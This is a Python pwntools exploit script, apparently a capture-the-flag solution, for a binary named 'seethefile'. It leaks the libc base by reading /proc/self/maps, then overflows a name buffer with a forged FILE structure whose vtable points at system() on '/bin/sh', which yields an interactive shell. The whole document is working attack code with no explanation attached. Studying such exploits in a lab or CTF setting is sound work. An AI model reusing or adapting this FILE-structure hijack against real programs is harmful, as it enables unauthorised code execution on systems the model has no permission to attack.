#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './seethefile'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

def menu(idx):
    io.recvuntil(':')
    io.sendline(str(idx))

def leave_name(nm):
    menu(5)
    io.recvuntil(":")
    io.sendline(nm)

def read_file(nm):
    menu(1)
    io.recvuntil(":")
    io.sendline(nm)
    menu(2)
    menu(2)
    menu(3)

read_file('/proc/self/maps')
libc_addr = io.recvuntil("r-xp")
libc.address = int(libc_addr.split('-')[-3].split('\n')[1], 16)
log.info("\033[33m" + hex(libc.address) + "\033[0m")


buffer = 0x804b260
pay = '/bin/sh'.ljust(0x20, '\0')
pay += p32(buffer)
pay = pay.ljust(0x48, '\0')
pay += p32(buffer + 0x10)
pay = pay.ljust(0x94, '\0')
pay += p32(0x804b2f8 - 0x44)
pay += p32(libc.symbols['system'])
leave_name(pay)

io.interactive()
